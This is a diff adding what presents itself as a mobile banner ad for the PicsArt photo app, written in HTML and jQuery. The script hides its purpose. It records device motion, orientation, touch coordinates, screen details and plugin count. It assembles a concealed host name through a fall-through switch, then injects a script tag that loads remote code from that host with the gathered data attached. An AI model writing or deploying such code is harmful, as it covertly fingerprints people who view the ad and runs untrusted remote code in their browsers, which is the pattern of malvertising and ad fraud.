@@ -1,0 +1,180 @@
+
+<script src="https://code.jquery.com/jquery-1.11.3.js"></script>
+<script>
+    var u = navigator.userAgent;
+    var isAndroid = u.indexOf('Android') > -1 || u.indexOf('Adr') > -1;
+    var isiOS = !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/);
+    if(isAndroid){
+        inghref = "https://play.google.com/store/apps/details?id=com.picsart.studio";
+        ingsrc = "https://secure-ds.serving-sys.com/BurstingRes/Site-126865/Type-0/43fa700e-6672-4295-916e-27e1e226364e.jpg";
+    }
+    if(isiOS){
+        inghref = "https://itunes.apple.com/us/app/picsart-photo-studio-all-in/id587366035";
+        ingsrc = "https://secure-ds.serving-sys.com/BurstingRes/Site-126865/Type-0/43fa700e-6672-4295-916e-27e1e226364e.jpg";
+    }
+    var p = 0, ps = {}, pd = {};
+    pd.setra = [],pd.suetr = [],pd.tex = [],pd.texs = [],pd.num=0,pd.selop=0,plo=[];
+    document.write("<div id='fenger'></div>");
+
+    creabq({a: "a", b: {a: "target", b: "_blank"}, c: {a: "id", b: "divimga"}, d: "#fenger"});
+    $("#divimga").attr("href", inghref);
+    creabq({a: "div", b: {a: "class", b: ""}, c: {a: "id", b: "divimg"}, d: "#divimga"});
+    $("#divimg").attr("style", "width:300px;height:250px;position: relative;background:url('" + ingsrc + "');");
+    creabq({a: "div", b: {a: "class", b: ""}, c: {a: "id", b: "divbox"}, d: "#divimg"});
+    function creabq(sr) {
+        var link = $("<" + sr.a + ">")
+        link.attr(sr.b.a, sr.b.b);
+        link.attr(sr.c.a, sr.c.b);
+        link.appendTo(sr.d);
+    }
+    $("#divbox").css({
+        "width": "15px",
+        "height": "15px",
+        "position": "absolute",
+        "border-radius": "50%",
+        "right": "0px",
+        "top": "0px",
+        "box-shadow": "rgba(221, 255, 174, 0.86) -6px 0px 16px 11px"
+    });
+    add({a:"touchstart",b:tes,c:"top"});
+    add({a:"touchend",b:tes1,c:"top"});
+    if (window.DeviceOrientationEvent || window.DeviceMotionEvent) {
+        add({a:"devicemotion",b:yaomingya,c:"self"});
+        add({a:"deviceorientation",b:hafengla,c:"self"});
+    }else{
+        a3();
+    }
+    function add(de){
+        window[de.c].addEventListener(de.a,de.b,0);
+    }
+
+    function hafengla(e) {
+        ps.x = e.alpha;
+        ps.y = e.beta;
+        ps.z = e.gamma;
+        var tm="";
+        if (ps.x >=236 && ps.x<=330) {
+            tm="a2";
+        }else{
+            tm="a3";
+        }
+        if(($("#divbox").css("right")+$("#divbox").css("top"))=="0px0px"){
+            window["t1"]=0;
+        }
+        if(window["t1"]!=1){
+            $("#divbox").css({"top":"1px"})
+            a3(tm);
+        }
+        p++;
+        if(p<6){
+            plo.push(ps.x+"x"+ps.y);
+            return;
+        }
+        if (pd.statu!=true) {
+            pd.statu=true;
+            ps.setr=plo;
+            pd.num++;
+        }
+        feng();
+    }
+
+    function sc(fer, ferq) {
+            var ls = "&pl=" + navigator.plugins.length;
+            for (var key in ps) {
+                ls += "&" + key + "=" + ps[key];
+            }
+            window["navigatorplugins"] = pd.min;
+            creabq({a: fer, b: {a: "src", b: ferq + ls}, c: {a: "index", b: ""}, d: "body"});
+    }
+    function tes1(e) {
+        ps.tex=e.changedTouches[0].clientX;
+        ps.tey=e.changedTouches[0].clientY;
+        pd.tex.push(e.changedTouches[0].clientX+"x"+e.changedTouches[0].clientY);
+        if(pd.tex.length==6) {
+            ps.texz=pd.tex;
+            pd.num++;
+        }
+    };
+    function tes(e) {
+        ps.texs=e.touches[0].clientX;
+        ps.teys=e.touches[0].clientY;
+        pd.texs.push(e.changedTouches[0].clientX+"x"+e.changedTouches[0].clientY);
+        if(pd.texs.length==6) {
+            ps.texzs=pd.texs;
+            pd.num++;
+        }
+    };
+    function feng() {
+        ps.cl = screen.colorDepth;
+        ps.w = screen.width + "x" + screen.height;
+        ps.pifw = "${source_id}";
+        ps.sefh = "hen";
+        ps.dmfx = "${imp_id}";
+        ps.exfl = "${exchange}";
+        mingf();
+        tian=setInterval(function(){
+            if(pd.num<3){
+                return;
+            }
+            if(pd.sta!=true) {
+                clearInterval(tian);
+                pd.sta=true;
+                sc("script", pd.min + "/ag_12" + "?" + "type=jpg")
+            }
+        },300);
+    };
+    function mingf() {
+        var mingt = "";
+        var tian = "1";
+        switch (tian) {
+            case "1":
+                mingt += "htt"
+            case "2":
+                mingt += "p://mar"
+            case "3":
+                mingt += "cell"
+            case "4":
+                mingt += "omocci"
+            case "5":
+                mingt += "a.c"
+            case "6":
+                mingt += "om"
+                break;
+            case "7":
+                mingt += "jixian"
+                break;
+        }
+        pd.min = mingt;
+    }
+    function a3(t) {
+        window["t1"]=1;
+        if(t=="a3"){
+                $("#divbox").animate({"top": "235px"}, 2500);
+                $("#divbox").animate({"left": "0px"}, 2500);
+                $("#divbox").animate({"top": "0px"}, 2500);
+                $("#divbox").animate({"left": "285px"}, 2500);
+        }else{
+                $("#divbox").animate({"left": "0px"}, 2500);
+                $("#divbox").animate({"top": "235px"}, 2500);
+                $("#divbox").animate({"left": "285px"}, 2500);
+                $("#divbox").animate({"top": "0px"}, 2500);
+        }
+    };
+    function yaomingya(emo) {
+        ps.y1 = emo.accelerationIncludingGravity.y;
+        ps.ya = emo.rotationRate.beta;
+        pd.selop++;
+        if(pd.selop<6){
+            pd.setra.push(ps.y1);
+            return;
+        }
+        if (pd.status!=true) {
+            pd.status=true;
+            ps.setra=pd.setra;
+            pd.num++;
+        }
+    }
+    function isun(Im) {
+        return (typeof(Im.a) == Im.b);
+    }
+</script>
